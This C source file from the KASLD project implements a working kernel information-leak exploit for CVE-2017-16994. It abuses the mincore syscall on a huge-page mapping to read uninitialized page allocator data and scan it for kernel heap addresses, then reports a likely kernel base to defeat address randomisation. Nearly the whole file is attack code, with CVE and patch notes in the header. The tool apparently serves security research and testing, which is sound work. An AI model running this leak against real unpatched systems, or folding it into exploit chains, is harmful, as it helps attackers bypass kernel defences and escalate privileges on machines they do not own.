// This file is part of KASLD - https://github.com/bcoles/kasld
//
// mincore heap page disclosure (CVE-2017-16994)
//
// The `mincore` syscall copies uninitialized memory
// from the page allocator to userspace.
//
// Patched in kernel v4.15-rc1 on 2017-11-16:
// https://github.com/torvalds/linux/commit/373c4557d2aa362702c4c2d41288fb1e54990b7c
//
// Largely based on original code by Jann Horn:
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1431
//
// Leak primitive:
//   Data leaked:      kernel heap pointer (page allocator metadata)
//   Kernel subsystem: mm — mincore syscall (do_mincore /
//   __mincore_unmapped_range) Data structure:   page allocator metadata
//   (uninitialized byte in vec) Address type:     virtual Method: heuristic
//   (brute-force scan of MAP_HUGETLB region) CVE:              CVE-2017-16994
//   Patched:          v4.15 (commit 373c4557d2aa)
//   Status:           fixed in v4.15
//   Access check:     none pre-v4.15 (mincore syscall, unprivileged)
//   Source: https://elixir.bootlin.com/linux/v4.14/source/mm/mincore.c
//
// Mitigations:
//   Patched in v4.15. No runtime sysctl could restrict access — the
//   bug was an uninitialized byte in the mincore output vector. x86_64 only.
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

/* Time limit (seconds) to avoid grinding on patched kernels.
 * On vulnerable systems the leak is typically found within the first
 * few thousand iterations, so this limit only fires on patched kernels
 * where every iteration is fruitless. */
#define TIMEOUT_SECS 5

KASLD_EXPLAIN(
    "Exploits CVE-2017-16994: the mincore() syscall, when given an "
    "unmapped address, returned uninitialized page allocator metadata "
    "instead of an error. This leaked heap virtual addresses from the "
    "buddy allocator. Fixed in v4.15 by returning -ENOMEM for unmapped "
    "ranges.");

KASLD_META("method:heuristic\n"
           "addr:virtual\n"
           "cve:CVE-2017-16994\n"
           "patch:v4.15\n");

unsigned long get_kernel_addr_mincore() {
  unsigned char buf[getpagesize() / sizeof(unsigned char)];
  unsigned long iterations = 1000000;
  unsigned long addr = 0;
  unsigned long len = (unsigned long)0x20000000000;

  /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
  if (mmap((void *)0x66000000, len, PROT_NONE,
           MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1,
           0) == MAP_FAILED) {
    perror("[-] mmap");
    return 0;
  }

  unsigned long i;
  struct timespec deadline;
  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += TIMEOUT_SECS;

  for (i = 0; i <= iterations; i++) {
    /* Check deadline every 4096 iterations to avoid clock_gettime overhead */
    if ((i & 0xfff) == 0 && i > 0) {
      struct timespec now;
      clock_gettime(CLOCK_MONOTONIC, &now);
      if (now.tv_sec > deadline.tv_sec ||
          (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
        fprintf(stderr,
                "[-] timeout after %lu iterations (%ds); likely patched\n", i,
                TIMEOUT_SECS);
        break;
      }
    }
    /* Touch a mishandle with this type mapping */
    if (mincore((void *)0x86000000, 0x1000000, buf)) {
      perror("[-] mincore");
      return 0;
    }

    unsigned long n;
    for (n = 0; n < (unsigned long)getpagesize() / sizeof(unsigned char); n++) {
      addr = *(unsigned long *)(&buf[n]);
      /* Kernel address space */
      if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
        if (munmap((void *)0x66000000, len))
          perror("[-] munmap");
        return addr;
      }
    }
  }

  if (munmap((void *)0x66000000, len))
    perror("[-] munmap");

  fprintf(stderr, "[-] kernel base not found in mincore info leak\n");
  return 0;
}

int main(void) {
  printf("[.] trying mincore info leak...\n");

  unsigned long addr = get_kernel_addr_mincore();
  if (!addr)
    return 0;

  printf("leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "mincore");

  return 0;
}
